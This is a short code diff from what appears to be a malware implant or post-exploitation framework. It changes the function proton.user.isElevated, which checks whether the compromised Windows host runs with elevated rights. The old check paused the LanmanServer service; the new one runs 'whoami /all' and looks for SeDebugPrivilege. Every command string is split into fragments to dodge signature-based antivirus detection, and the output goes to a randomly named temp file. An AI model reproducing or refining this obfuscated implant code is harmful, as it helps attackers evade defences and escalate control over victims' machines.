@@ -137,11 +137,11 @@ proton.user.isElevated = function()
 {
     try
     {
-        var #res# = proton.shell.exec("net p"+"ause lanman"+"server", "%TE"+"MP%\\"+proton.uuid()+".txt");
-        if (#res#.indexOf("5") == -1)
-            return true;
-        else
+        var #res# = proton.shell.exec("whoa"+"mi /"+"all", "%TE"+"MP%\\"+proton.uuid()+".txt");
+        if (#res#.indexOf("SeDebugPrivilege") == -1)
             return false;
+        else
+            return true;
     }
     catch(e)
     {
